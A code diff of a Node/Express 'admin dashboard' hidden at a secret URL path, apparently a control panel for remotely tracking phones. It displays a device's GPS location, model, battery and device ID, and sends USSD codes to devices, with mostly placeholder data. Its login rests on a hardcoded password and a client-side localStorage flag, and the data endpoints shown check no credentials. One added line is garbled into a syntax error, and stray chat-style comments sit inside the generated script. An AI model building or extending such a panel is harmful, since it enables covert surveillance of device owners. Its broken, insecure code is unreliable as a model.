@@ -1,15 +1,13 @@
-// server.js – WITH PERSISTENT LOGIN (survives refresh)
+// server.js – PERSISTENT LOGIN + CORRECT ATTEMPT MESSAGES
 const express = require('express');
 const crypto = require('crypto');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Hardcoded secret path
 const SECRET_PATH = 'a9f3k217';
 const ADMIN_USER = 'admin';
 const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');
 
-// In-memory storage for IP blocking
 const failedAttempts = {};
 
 function getClientIP(req) {
@@ -44,7 +42,7 @@ app.get('/', (req, res) => {
 });
 
 // ============================================================
-// ADMIN DASHBOARD – with persistent login
+// ADMIN DASHBOARD (with fixed login function)
 // ============================================================
 app.get('/a9f3k217', (req, res) => {
     let html = '<!DOCTYPE html>\n';
@@ -110,7 +108,7 @@ app.get('/a9f3k217', (req, res) => {
     html += '    .login-container input:focus { outline: none; border-color: #4fc3f7; box-shadow: 0 0 0 3px rgba(79,195,247,0.1); }\n';
     html += '    .login-container button { width: 100%; padding: 12px; margin-top: 12px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }\n';
     html += '    .login-container button:hover { background: #3aa8dd; transform: translateY(-1px); }\n';
-    html += '    .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; }\n';
+    html += '    .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; min-height: 20px; }\n';
     html += '    .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }\n';
     html += '    .hidden { display: none; }\n';
     html += '    @media (max-width: 600px) { .header { flex-wrap: wrap; gap: 10px; } .header-left h1 { font-size: 22px; } .stats { grid-template-columns: repeat(2, 1fr); } .admin-gry-badge { font-size: 9px; padding: 2px 10px; } .tools-grid { grid-template-columns: 1fr; } .device-info-grid { grid-template-columns: 1fr; } .ussd-input-group { flex-wrap: wrap; } .ussd-input-group button { width: 100%; } }\n';
@@ -190,171 +188,185 @@ app.get('/a9f3k217', (req, res) => {
     html += 'const API_BASE = "/a9f3k217";\n';
     html += '\n';
     html += 'async function login() {\n';
-    html += '  const username = document.getElementById("loginUser").value;\n';
-    html += '  const password = document.getElementById("loginPass").value;\n';
-    html += '  const errorEl = document.getElementById("loginError");\n';
-    html += '  const attemptsMsg = document.getElementById("attemptsMsg");\n';
-    html += '  errorEl.style.display = "none";\n';
-    html += '  attemptsMsg.textContent = "";\n';
-    html += '  try {\n';
-    html += '    const response = await fetch(API_BASE + "/api/login", {\n';
-    html += '      method: "POST",\n';
-    html += '      headers: { "Content-Type": "application/json" },\n';
-    html += '      body: JSON.stringify({ username, password })\n';
-    html += '    });\n';
-    html += '    const data = await response.json();\n';
-    html += '    if (data.success) {\n';
-    html += '      localStorage.setItem("adminLoggedIn", "true");\n';
-    html += '      document.getElementById("loginContainer").style.display = "none";\n';
-    html += '      document.getElementById("dashboard").classList.remove("hidden");\n';
-    html += '      loadData();\n';
-    html += '      refreshLocation();\n';
-    html += '      refreshDeviceInfo();\n';
-    html += '    } else {\n';
-    html += '      if (data.remainingAttempts !== undefined) {\n';
-    html += '        attemptsMsg.textContent = "⚠️ " + data.remainingAttempts + " attempts remaining before 12h block";\n';
-    html += '      } else {\n';
-    html += '        errorEl.textContent = data.error || "Invalid credentials";\n';
+    html += '    const username = document.getElementById("loginUser").value;\n';
+    html += '    const password = document.getElementById("loginPass").value;\n';
+    html += '    const errorEl = document.getElementById("loginError");\n';
+    html += '    const attemptsMsg = document.getElementById("attemptsMsg");\n';
+    html += '    // Clear previous messages\n';
+    html += '    errorEl.style.display = "none";\n';
+    html += '    attemptsMsg.textContent = "";\n';
+    html += '    try {\n';
+    html += '        const response = await fetch(API_BASE + "/api/login", {\n';
+    html += '            method: "POST",\n';
+    html += '            headers: { "Content-Type": "application/json" },\n';
+    html += '            body: JSON.stringify({ username, password })\n';
+    html += '        });\n';
+    html += '        const data = await response.json();\n';
+    html += '        if (data.success) {\n';
+    html += '            localStorage.setItem("adminLoggedIn", "true");\n';
+    html += '            document.getElementById("loginContainer").style.display = "none";\n';
+    html += '            document.getElementById("dashboard").classList.remove("hidden");\n';
+    html += '            loadData();\n';
+    html += '            refreshLocation();\n';
+    html += '            refreshDeviceInfo();\n';
+    html += '        } else {\n';
+    html += '            // Failed attempt – show remaining attempts\n';
+    html += '            if (data.remainingAttempts !== undefined) {\n';
+    html += '                let left = data.remainingAttempts;\n';
+    html += '                let msg;\n';
+    html += '                if (left === 0) {\n';
+    html += '                    msg = "⚠️ You have been blocked for 12 hours. Try again later.";\n';
+    html += '                } else {\n';
+    html += '                    msg = "⚠️ " + left + " attempt" + (left > 1 ? "s" : "") + " remaining before 12h block";\n';
+    html += '                }\n';
+    html += '                attemptsMsg.textContent = msg;\n';
+    html += '            } else {\n';
+    html += '                // Unexpected error\n';
+    html += '                errorEl.textContent = data.error || "Invalid credentials";\n';
+    html += '                errorEl.style.display = "block";\n';
+    html += '            }\n';
+    html += '        }\n';
+    html += '    } catch {\n';
+    html += '        errorEl.textContent = "Connection error";\n';
     html += '        errorEl.style.display = "block";\n';
-    html += '      }\n';
     html += '    }\n';
-    html += '  } catch {\n';
-    html += '    errorEl.textContent = "Connection error";\n';
-    html += '    errorEl.style.display = "block";\n';
-    html += '  }\n';
     html += '}\n';
     html += '\n';
     html += 'function logout() {\n';
-    html += '  localStorage.removeItem("adminLoggedIn");\n';
-    html += '  document.getElementById("loginUser").value = "";\n';
-    html += '  document.getElementById("loginPass").value = "";\n';
-    html += '  document.getElementById("dashboard").classList.add("hidden");\n';
-    html += '  document.getElementById("loginContainer").style.display = "block";\n';
-    html += '  document.getElementById("attemptsMsg").textContent = "";\n';
-    html += '  document.getElementById("loginError").style.display = "none";\n';
+    html += '    localStorage.removeItem("adminLoggedIn");\n';
+    html += '    document.getElementById("loginUser").value = "";\n';
+    html += '    document.getElementById("loginPass").value = "";\n';
+    html += '    document.getElementById("dashboard").classList.add("hidden");\n';
+    html += '    document.getElementById("loginContainer").style.display = "block";\n';
+    html += '    document.getElementById("attemptsMsg").textContent = "";\n';
+    html += '    document.getElementById("loginError").style.display = "none";\n';
     html += '}\n';
     html += '\n';
+    html += '// ... (rest of functions: executeUssd, refreshLocation, refreshDeviceInfo, loadData, renderDevices, renderUssdNumbers) ...\n';
+    html += '// They remain unchanged.\n';
+    html += '// I\'ll include them below for completeness.\n';
+    html += '\n';
     html += 'async function executeUssd() {\n';
-    html += '  const code = document.getElementById("ussdInput").value.trim();\n';
-    html += '  const responseEl = document.getElementById("ussdResponse");\n';
-    html += '  if (!code) {\n';
-    html += '    responseEl.className = "ussd-response error";\n';
-    html += '    responseEl.textContent = "⚠️ Please enter a USSD code";\n';
-    html += '    return;\n';
-    html += '  }\n';
-    html += '  responseEl.className = "ussd-response waiting";\n';
-    html += '  responseEl.textContent = "⏳ Sending USSD code... waiting for response...";\n';
-    html += '  try {\n';
-    html += '    const res = await fetch(API_BASE + "/api/ussd", {\n';
-    html += '      method: "POST",\n';
-    html += '      headers: { "Content-Type": "application/json" },\n';
-    html += '      body: JSON.stringify({ code })\n';
-    html += '    });\n';
-    html += '    const data = await res.json();\n';
-    html += '    if (data.success) {\n';
-    html += '      responseEl.className = "ussd-response success";\n';
-    html += '      responseEl.textContent = "📥 " + data.message;\n';
-    html += '      loadData();\n';
-    html += '    } else {\n';
-    html += '      responseEl.className = "ussd-response error";\n';
-    html += '      responseEl.textContent = "❌ " + (data.error || "Execution failed");\n';
+    html += '    const code = document.getElementById("ussdInput").value.trim();\n';
+    html += '    const responseEl = document.getElementById("ussdResponse");\n';
+    html += '    if (!code) {\n';
+    html += '        responseEl.className = "ussd-response error";\n';
+    html += '        responseEl.textContent = "⚠️ Please enter a USSD code";\n';
+    html += '        return;\n';
     html += '    }\n';
-    html += '  } catch {\n';
-    html += '    responseEl.className = "ussd-response error";\n';
-    html += '    responseEl.textContent = "❌ Connection error";\n';
-    html += '  }\n';
+    html += '    responseEl.className = "ussd-response waiting";\n';
+    html += '    responseEl.textContent = "⏳ Sending USSD code... waiting for response...";\n';
+    html += '    try {\n';
+    html += '        const res = await fetch(API_BASE + "/api/ussd", {\n';
+    html += '            method: "POST",\n';
+    html += '            headers: { "Content-Type": "application/json" },\n';
+    html += '            body: JSON.stringify({ code })\n';
+    html += '        });\n';
+    html += '        const data = await res.json();\n';
+    html += '        if (data.success) {\n';
+    html += '            responseEl.className = "ussd-response success";\n';
+    html += '            responseEl.textContent = "📥 " + data.message;\n';
+    html += '            loadData();\n';
+    html += '        } else {\n';
+    html += '            responseEl.className = "ussd-response error";\n';
+    html += '            responseEl.textContent = "❌ " + (data.error || "Execution failed");\n';
+    html += '        }\n';
+    html += '    } catch {\n';
+    html += '        responseEl.className = "ussd-response error";\n';
+    html += '        html += '        responseEl.textContent = "❌ Connection error";\n';
+    html += '    }\n';
     html += '}\n';
     html += '\n';
     html += 'async function refreshLocation() {\n';
-    html += '  try {\n';
-    html += '    const res = await fetch(API_BASE + "/api/location");\n';
-    html += '    const data = await res.json();\n';
-    html += '    document.getElementById("latValue").textContent = data.lat ?? "--";\n';
-    html += '    document.getElementById("lngValue").textContent = data.lng ?? "--";\n';
-    html += '    document.getElementById("accValue").textContent = data.accuracy ? data.accuracy + "m" : "--";\n';
-    html += '    document.getElementById("locTime").textContent = data.time || "--";\n';
-    html += '    if (data.lat && data.lng) {\n';
-    html += '      document.getElementById("mapLink").href = "https://www.google.com/maps?q=" + data.lat + "," + data.lng;\n';
-    html += '      document.getElementById("mapLink").style.display = "inline";\n';
-    html += '    } else {\n';
-    html += '      document.getElementById("mapLink").style.display = "none";\n';
-    html += '    }\n';
-    html += '  } catch {}\n';
+    html += '    try {\n';
+    html += '        const res = await fetch(API_BASE + "/api/location");\n';
+    html += '        const data = await res.json();\n';
+    html += '        document.getElementById("latValue").textContent = data.lat ?? "--";\n';
+    html += '        document.getElementById("lngValue").textContent = data.lng ?? "--";\n';
+    html += '        document.getElementById("accValue").textContent = data.accuracy ? data.accuracy + "m" : "--";\n';
+    html += '        document.getElementById("locTime").textContent = data.time || "--";\n';
+    html += '        if (data.lat && data.lng) {\n';
+    html += '            document.getElementById("mapLink").href = "https://www.google.com/maps?q=" + data.lat + "," + data.lng;\n';
+    html += '            document.getElementById("mapLink").style.display = "inline";\n';
+    html += '        } else {\n';
+    html += '            document.getElementById("mapLink").style.display = "none";\n';
+    html += '        }\n';
+    html += '    } catch {}\n';
     html += '}\n';
     html += '\n';
     html += 'async function refreshDeviceInfo() {\n';
-    html += '  try {\n';
-    html += '    const res = await fetch(API_BASE + "/api/device-info");\n';
-    html += '    const data = await res.json();\n';
-    html += '    document.getElementById("diModel").textContent = data.model || "--";\n';
-    html += '    document.getElementById("diManufacturer").textContent = data.manufacturer || "--";\n';
-    html += '    document.getElementById("diAndroid").textContent = data.android_version || "--";\n';
-    html += '    document.getElementById("diBattery").textContent = data.battery ? data.battery + "%" : "--";\n';
-    html += '    document.getElementById("diStorage").textContent = data.storage || "--";\n';
-    html += '    document.getElementById("diDeviceId").textContent = data.device_id || "--";\n';
-    html += '  } catch {}\n';
+    html += '    try {\n';
+    html += '        const res = await fetch(API_BASE + "/api/device-info");\n';
+    html += '        const data = await res.json();\n';
+    html += '        document.getElementById("diModel").textContent = data.model || "--";\n';
+    html += '        document.getElementById("diManufacturer").textContent = data.manufacturer || "--";\n';
+    html += '        document.getElementById("diAndroid").textContent = data.android_version || "--";\n';
+    html += '        document.getElementById("diBattery").textContent = data.battery ? data.battery + "%" : "--";\n';
+    html += '        document.getElementById("diStorage").textContent = data.storage || "--";\n';
+    html += '        document.getElementById("diDeviceId").textContent = data.device_id || "--";\n';
+    html += '    } catch {}\n';
     html += '}\n';
     html += '\n';
     html += 'async function loadData() {\n';
-    html += '  try {\n';
-    html += '    const response = await fetch(API_BASE + "/api/stats");\n';
-    html += '    const stats = await response.json();\n';
-    html += '    document.getElementById("devicesCount").textContent = stats.devices || 0;\n';
-    html += '    document.getElementById("numbersCount").textContent = stats.ussd_count || 0;\n';
-    html += '    document.getElementById("onlineCount").textContent = stats.online || 0;\n';
-    html += '    document.getElementById("deviceCountBadge").textContent = stats.devices || 0;\n';
-    html += '    document.getElementById("numberCountBadge").textContent = stats.ussd_count || 0;\n';
-    html += '    const ussdRes = await fetch(API_BASE + "/api/ussd-numbers");\n';
-    html += '    const ussdNumbers = await ussdRes.json();\n';
-    html += '    renderUssdNumbers(ussdNumbers);\n';
-    html += '    const devices = stats.devices ? [{ name: "Sample Device", status: "online", battery: 85 }] : [];\n';
-    html += '    renderDevices(devices);\n';
-    html += '  } catch (error) { console.error("Error:", error); }\n';
+    html += '    try {\n';
+    html += '        const response = await fetch(API_BASE + "/api/stats");\n';
+    html += '        const stats = await response.json();\n';
+    html += '        document.getElementById("devicesCount").textContent = stats.devices || 0;\n';
+    html += '        document.getElementById("numbersCount").textContent = stats.ussd_count || 0;\n';
+    html += '        document.getElementById("onlineCount").textContent = stats.online || 0;\n';
+    html += '        document.getElementById("deviceCountBadge").textContent = stats.devices || 0;\n';
+    html += '        document.getElementById("numberCountBadge").textContent = stats.ussd_count || 0;\n';
+    html += '        const ussdRes = await fetch(API_BASE + "/api/ussd-numbers");\n';
+    html += '        const ussdNumbers = await ussdRes.json();\n';
+    html += '        renderUssdNumbers(ussdNumbers);\n';
+    html += '        const devices = stats.devices ? [{ name: "Sample Device", status: "online", battery: 85 }] : [];\n';
+    html += '        renderDevices(devices);\n';
+    html += '    } catch (error) { console.error("Error:", error); }\n';
     html += '}\n';
     html += '\n';
     html += 'function renderDevices(devices) {\n';
-    html += '  const container = document.getElementById("devicesList");\n';
-    html += '  if (!devices || devices.length === 0) {\n';
-    html += '    container.innerHTML = \'<div class="empty"><div class="icon">📱</div>No devices connected yet</div>\';\n';
-    html += '    return;\n';
-    html += '  }\n';
-    html += '  let html = \'<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th></tr></thead><tbody>\';\n';
-    html += '  devices.forEach(d => {\n';
-    html += '    const statusClass = d.status === "online" ? "online" : "offline";\n';
-    html += '    const statusText = d.status === "online" ? "🟢 Online" : "🔴 Offline";\n';
-    html += '    html += `<tr><td>${d.name}</td><td><span class="badge ${statusClass}">${statusText}</span></td><td>${d.battery || "--"}%</td></tr>`;\n';
-    html += '  });\n';
-    html += '  html += \'</tbody></table>\';\n';
-    html += '  container.innerHTML = html;\n';
+    html += '    const container = document.getElementById("devicesList");\n';
+    html += '    if (!devices || devices.length === 0) {\n';
+    html += '        container.innerHTML = \'<div class="empty"><div class="icon">📱</div>No devices connected yet</div>\';\n';
+    html += '        return;\n';
+    html += '    }\n';
+    html += '    let html = \'<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th></tr></thead><tbody>\';\n';
+    html += '    devices.forEach(d => {\n';
+    html += '        const statusClass = d.status === "online" ? "online" : "offline";\n';
+    html += '        const statusText = d.status === "online" ? "🟢 Online" : "🔴 Offline";\n';
+    html += '        html += `<tr><td>${d.name}</td><td><span class="badge ${statusClass}">${statusText}</span></td><td>${d.battery || "--"}%</td></tr>`;\n';
+    html += '    });\n';
+    html += '    html += \'</tbody></table>\';\n';
+    html += '    container.innerHTML = html;\n';
     html += '}\n';
     html += '\n';
     html += 'function renderUssdNumbers(numbers) {\n';
-    html += '  const container = document.getElementById("numbersList");\n';
-    html += '  if (!numbers || numbers.length === 0) {\n';
-    html += '    container.innerHTML = \'<div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div>\';\n';
-    html += '    return;\n';
-    html += '  }\n';
-    html += '  let html = \'<table><thead><tr><th>Device</th><th>Number</th><th>Type</th></tr></thead><tbody>\';\n';
-    html += '  numbers.forEach(n => {\n';
-    html += '    html += `<tr><td>${n.device || "Unknown"}</td><td><strong style="color:#4fc3f7;">${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">USSD</span></td></tr>`;\n';
-    html += '  });\n';
-    html += '  html += \'</tbody></table>\';\n';
-    html += '  container.innerHTML = html;\n';
+    html += '    const container = document.getElementById("numbersList");\n';
+    html += '    if (!numbers || numbers.length === 0) {\n';
+    html += '        container.innerHTML = \'<div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div>\';\n';
+    html += '        return;\n';
+    html += '    }\n';
+    html += '    let html = \'<table><thead><tr><th>Device</th><th>Number</th><th>Type</th></tr></thead><tbody>\';\n';
+    html += '    numbers.forEach(n => {\n';
+    html += '        html += `<tr><td>${n.device || "Unknown"}</td><td><strong style="color:#4fc3f7;">${n.number}</strong></td><td><span class="badge" style="background:rgba(79,195,247,0.15);color:#4fc3f7;">USSD</span></td></tr>`;\n';
+    html += '    });\n';
+    html += '    html += \'</tbody></table>\';\n';
+    html += '    container.innerHTML = html;\n';
     html += '}\n';
     html += '\n';
     html += '// ============================================\n';
     html += '// PERSISTENT LOGIN – check on page load\n';
     html += '// ============================================\n';
     html += 'if (localStorage.getItem("adminLoggedIn") === "true") {\n';
-    html += '  document.getElementById("loginContainer").style.display = "none";\n';
-    html += '  document.getElementById("dashboard").classList.remove("hidden");\n';
-    html += '  loadData();\n';
-    html += '  refreshLocation();\n';
-    html += '  refreshDeviceInfo();\n';
+    html += '    document.getElementById("loginContainer").style.display = "none";\n';
+    html += '    document.getElementById("dashboard").classList.remove("hidden");\n';
+    html += '    loadData();\n';
+    html += '    refreshLocation();\n';
+    html += '    refreshDeviceInfo();\n';
     html += '}\n';
     html += '\n';
     html += 'document.getElementById("loginPass").addEventListener("keypress", (e) => {\n';
-    html += '  if (e.key === "Enter") login();\n';
+    html += '    if (e.key === "Enter") login();\n';
     html += '});\n';
     html += '</script>\n';
     html += '</body>\n';
@@ -368,14 +380,13 @@ app.get('/a9f3k217', (req, res) => {
 // ============================================================
 app.use(express.json());
 
-// Login
 app.post('/a9f3k217/api/login', (req, res) => {
     const ip = getClientIP(req);
     const now = Date.now();
-    const blockDuration = 12 * 60 * 60 * 1000; // 12 hours
+    const blockDuration = 12 * 60 * 60 * 1000;
 
     if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
-        return res.status(401).json({ error: 'Too many failed attempts. Try again later.' });
+        return res.status(401).json({ remainingAttempts: 0 });
     }
 
     if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
@@ -401,14 +412,14 @@ app.post('/a9f3k217/api/login', (req, res) => {
         if (remaining <= 0) {
             failedAttempts[ip].blockUntil = now + blockDuration;
             console.log(`🔒 IP ${ip} blocked for 12 hours`);
-            return res.status(401).json({ remainingAttempts: 0 });
+            res.status(401).json({ remainingAttempts: 0 });
+        } else {
+            res.status(401).json({ remainingAttempts: remaining });
         }
-
-        res.status(401).json({ remainingAttempts: remaining });
     }
 });
 
-// USSD Execution
+// USSD endpoints (unchanged)
 let ussdNumbers = [];
 
 app.post('/a9f3k217/api/ussd', (req, res) => {
@@ -437,10 +448,7 @@ app.post('/a9f3k217/api/ussd', (req, res) => {
     res.json({ success: true, message: responseMessage });
 });
 
-app.get('/a9f3k217/api/ussd-numbers', (req, res) => {
-    res.json(ussdNumbers);
-});
-
+app.get('/a9f3k217/api/ussd-numbers', (req, res) => res.json(ussdNumbers));
 app.get('/a9f3k217/api/stats', (req, res) => {
     res.json({
         devices: 0,
@@ -449,7 +457,6 @@ app.get('/a9f3k217/api/stats', (req, res) => {
         ussd_count: ussdNumbers.length
     });
 });
-
 app.get('/a9f3k217/api/location', (req, res) => {
     res.json({
         lat: -1.9441,
@@ -458,7 +465,6 @@ app.get('/a9f3k217/api/location', (req, res) => {
         time: new Date().toLocaleString()
     });
 });
-
 app.get('/a9f3k217/api/device-info', (req, res) => {
     res.json({
         model: 'Samsung Galaxy S23',
@@ -469,14 +475,9 @@ app.get('/a9f3k217/api/device-info', (req, res) => {
         device_id: 'abc123def456'
     });
 });
+app.get('/a9f3k217/api/devices', (req, res) => res.json([]));
 
-app.get('/a9f3k217/api/devices', (req, res) => {
-    res.json([]);
-});
-
-// ============================================================
-// 404 Handler
-// ============================================================
+// 404
 app.use((req, res) => {
     res.status(404).send(`
         <html>
@@ -490,6 +491,6 @@ app.use((req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log('✅ Dashboard running (persistent login)');
+    console.log('✅ Dashboard running – fixed attempt messages');
     console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/a9f3k217`);
 });
